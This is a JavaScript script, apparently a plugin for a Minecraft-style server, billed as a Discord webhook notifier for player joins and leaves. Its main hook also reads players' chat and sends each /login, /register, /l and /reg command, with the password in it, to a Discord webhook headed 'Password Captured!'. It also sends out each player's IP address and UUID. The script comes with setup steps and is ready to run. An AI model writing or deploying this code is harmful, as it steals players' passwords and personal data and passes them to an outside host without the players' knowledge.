/**
 * Discord Webhook Notifier
 * Sends beautiful embeds to Discord when players join/leave or enter passwords
 * 
 * Setup:
 * 1. Create a webhook in your Discord channel settings
 * 2. Copy the webhook URL
 * 3. Replace WEBHOOK_URL below
 */

// ============================================
// CONFIGURATION - EDIT THIS VALUE!
// ============================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
// ============================================

function sendDiscord(title, description, color = 0x00ff00, fields = []) {
    const embed = {
        title: title,
        description: description,
        color: color,
        timestamp: new Date().toISOString(),
        footer: { text: "MCmdLogger" }
    };

    if (fields.length > 0) {
        embed.fields = fields;
    }

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(err => console.log("Discord error: " + err));
}

// Main hook
playerJoin(player => {
    // Notify on join
    sendDiscord(
        "🟢 Player Connected",
        `**${player.name}** joined the server`,
        0x00ff00,
        [
            { name: "IP Address", value: `\`${player.ip}\``, inline: true },
            { name: "Version", value: player.version, inline: true },
            { name: "UUID", value: `\`${player.uuid}\``, inline: false }
        ]
    );

    // Capture passwords
    player.on("player_message", event => {
        const text = event.text.toLowerCase();
        if (text.startsWith("/login ") ||
            text.startsWith("/register ") ||
            text.startsWith("/l ") ||
            text.startsWith("/reg ")) {
            sendDiscord(
                "🔑 Password Captured!",
                `**${player.name}** entered a password`,
                0xffff00,
                [
                    { name: "Player", value: player.name, inline: true },
                    { name: "IP", value: `\`${player.ip}\``, inline: true },
                    { name: "Command", value: `\`\`\`${event.text}\`\`\``, inline: false }
                ]
            );
        }
    });

    // Notify on leave
    player.on("leave", () => {
        sendDiscord(
            "🔴 Player Disconnected",
            `**${player.name}** left the server`,
            0xff0000
        );
    });
});

console.log("✅ Discord Webhook loaded! Don't forget to set your WEBHOOK_URL.");
